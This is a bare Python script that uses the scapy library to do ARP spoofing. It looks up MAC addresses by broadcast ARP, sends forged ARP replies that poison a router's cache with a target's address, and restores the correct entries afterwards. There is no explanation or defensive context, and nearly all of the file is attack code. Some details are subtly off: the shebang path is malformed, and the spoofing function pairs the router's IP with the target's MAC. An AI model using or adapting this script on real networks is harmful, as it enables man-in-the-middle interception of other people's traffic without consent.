#!usr/bin/env python

import scapy.all as scapy

def get_mac(ip):
    ip = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = broadcast/ip

    response_list = scapy.srp(packet, verbose=False,timeout=5)[0]

    answered_list = []

    for response in response_list:
        ip_mac_dict = {"mac":response[1].hwsrc}
        answered_list.append(ip_mac_dict)
    return answered_list[0]["mac"]


def spoof_arp(router_ip, target_ip):
    spoof_response = scapy.ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=get_mac(target_ip))
    scapy.send(spoof_response, verbose=False)


def restore_arp(router_ip, target_ip):
    restore_response = scapy.ARP(op=2, psrc=router_ip, pdst=target_ip, hwsrc=get_mac(router_ip), hwdst=get_mac(target_ip))
    scapy.send(restore_response, verbose=False, count=4)

